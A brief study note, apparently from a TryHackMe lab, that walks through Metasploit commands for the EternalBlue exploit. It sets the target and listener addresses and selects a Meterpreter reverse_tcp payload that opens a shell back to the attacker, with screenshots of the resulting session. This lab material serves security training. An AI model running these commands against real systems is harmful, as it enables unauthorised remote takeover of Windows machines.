# 001 Practical Metasploit
![[Pasted image 20220719220707.png]]

`set VERBOSE true `= Always show more information.

`use ms17_010_eternalblue `exploit.

![[Pasted image 20220719221021.png]]

`set RHOST 10.10.125.249`

`set LHOST 10.10.200.92` :-Our local machine address that will be listening.

`set payload windows/x64/meterpreter/reverse_tcp` :- Make the connection back to the attacker.

![[Pasted image 20220719224057.png]]

Succesfully connected 
![[Pasted image 20220719224322.png]]
We can now execute commands and explore the target's machine.

**System Info**
![[Pasted image 20220719224757.png]]

meterpreter [cheat sheet](https://pentestmag.com/metasploit-cheat-sheet/) here.

---

More tools [[TryHackMe MOC#^17ad72|here]].
More on [[ETH Metasploit|Metasploit]].